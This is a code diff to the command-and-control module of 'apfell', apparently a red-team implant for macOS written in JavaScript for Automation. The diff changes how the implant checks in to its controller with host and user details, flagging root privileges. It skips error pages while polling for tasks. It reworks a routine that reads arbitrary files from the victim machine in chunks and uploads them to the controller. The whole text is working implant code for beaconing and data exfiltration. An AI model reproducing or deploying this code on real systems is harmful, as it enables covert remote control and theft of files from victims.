@@ -186,25 +186,28 @@ class customC2 extends baseC2{
 		//needs IP, PID, user, host, payload_type
 		//gets back a unique ID
 		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid};
+		if(user == 'root'){info['integrity_level'] = 3;}
 		//calls htmlPostData(url,data) to actually checkin
 		//var jsondata = this.htmlPostData(this.getPostNewCallbackPath(), JSON.stringify(info));
 		//Encrypt our data
 		//gets back a unique ID
-		if(this.exchanging_keys){
-		    var sessionID = this.negotiate_key();
-		    var jsondata = this.htmlPostData(this.getPostNewCallbackEKE_AES_PSK_Path(sessionID), JSON.stringify(info));
-		    //var jsondata = this.htmlPostData("api/v1.1/crypto/EKE/" + sessionID, JSON.stringify(info));
-		}else if(this.aes_psk != ""){
-		    var jsondata = this.htmlPostData(this.getPostNewCallbackAES_PSK_Path(), JSON.stringify(info));
+        if(this.exchanging_keys){
+            var sessionID = this.negotiate_key();
+            var jsondata = this.htmlPostData(this.getPostNewCallbackEKE_AES_PSK_Path(sessionID), JSON.stringify(info));
+            //var jsondata = this.htmlPostData("api/v1.1/crypto/EKE/" + sessionID, JSON.stringify(info));
+        }else if(this.aes_psk != ""){
+            var jsondata = this.htmlPostData(this.getPostNewCallbackAES_PSK_Path(), JSON.stringify(info));
             //var jsondata = this.htmlPostData("api/v1.1/crypto/aes_psk/" + apfell.uuid, JSON.stringify(info));
-		}else{
-		    var jsondata = this.htmlPostData(this.getPostNewCallbackPath(), JSON.stringify(info));
-		    //var jsondata = this.htmlPostData("api/v1.1/callbacks/", JSON.stringify(info));
-		}
-		apfell.id = jsondata.id;
-		// if we fail to get an ID number then exit the application
-		if(apfell.id == undefined){ $.NSApplication.sharedApplication.terminate(this); }
-		return jsondata;
+        }else{
+            var jsondata = this.htmlPostData(this.getPostNewCallbackPath(), JSON.stringify(info));
+            //var jsondata = this.htmlPostData("api/v1.1/callbacks/", JSON.stringify(info));
+        }
+        apfell.id = jsondata.id;
+
+        // if we fail to get an ID number then exit the application
+        if(apfell.id == undefined){ $.NSApplication.sharedApplication.terminate(this); }
+
+        return jsondata;
 	}
 	getTasking(){
 		// http://ip/api/v1.0/tasks/callback/{implant.id}/nextTask
@@ -266,6 +269,13 @@ class customC2 extends baseC2{
 				var error = Ref();
 				var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
 				var resp = $.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding);
+				var deepresp = ObjC.deepUnwrap(resp);
+				if(deepresp[0] == "<"|| deepresp.length == 0 || deepresp.includes("ERROR: Requested URL")){
+                    //this means we likely got back some form of error or redirect message, not our actual data
+                    //console.log(deepresp);
+                    continue;
+                }
+
 				//console.log("response: " + resp.js);
 				if(!this.exchanging_keys){
 				    //we're not doing the initial key exchange
@@ -302,6 +312,13 @@ class customC2 extends baseC2{
                 var error = Ref();
                 var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
                 var data =$.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding);
+                var deepresp = ObjC.deepUnwrap(data);
+				if(deepresp[0] == "<"|| deepresp.length == 0 || deepresp.includes("ERROR: Requested URL")){
+                    //this means we likely got back some form of error or redirect message, not our actual data
+                    //console.log(deepresp);
+                    continue;
+                }
+
                 if(this.aes_psk != ""){
                     var decrypted_message = this.decrypt_message(data);
                 }else{
@@ -321,12 +338,21 @@ class customC2 extends baseC2{
             var offset = 0;
             var url = this.getPostResponsePath(task.id);
             var chunkSize = 512000; //3500;
-            var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
-            // Get the file size by seeking;
-            var fileSize = handle.seekToEndOfFile;
+            try{
+                if(params[0] != "/"){
+                    var fileManager = $.NSFileManager.defaultManager;
+                    var cwd = fileManager.currentDirectoryPath.js;
+                    params = cwd + "/" + params;
+                }
+                var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
+                // Get the file size by seeking;
+                var fileSize = handle.seekToEndOfFile;
+            }catch(error){
+                output = JSON.stringify({'status': 'error', 'error': error.toString()})
+            }
             // always round up to account for chunks that are < chunksize;
             var numOfChunks = Math.ceil(fileSize / chunkSize);
-            var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id});
+            var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id, "full_path": params});
             var registerData = convert_to_nsdata(registerData);
             var registerFile = this.htmlPostData(url, JSON.stringify({"response": registerData.base64EncodedStringWithOptions(0).js}));
             //var registerFile = this.postResponse(task, registerData);
@@ -348,15 +374,14 @@ class customC2 extends baseC2{
                     currentChunk += 1;
                     data = handle.readDataOfLength(chunkSize);
                 }
-                var output = "Finished downloading file with id: " + registerFile['file_id'];
-                output += "\nBrowse to /api/v1.2/files/download/" + registerFile['file_id'];
+                var output = JSON.stringify({"status":"finished", "file_id": registerFile['file_id']})
             }
             else{
-               var output = "Failed to register file to download";
+               var output = JSON.stringify({'status': 'error', 'error': "Failed to register file to download"});
             }
         }
         else{
-            var output = "file does not exist";
+            var output = JSON.stringify({'status': 'error', 'error': "file does not exist"});
         }
         return output;
 	}
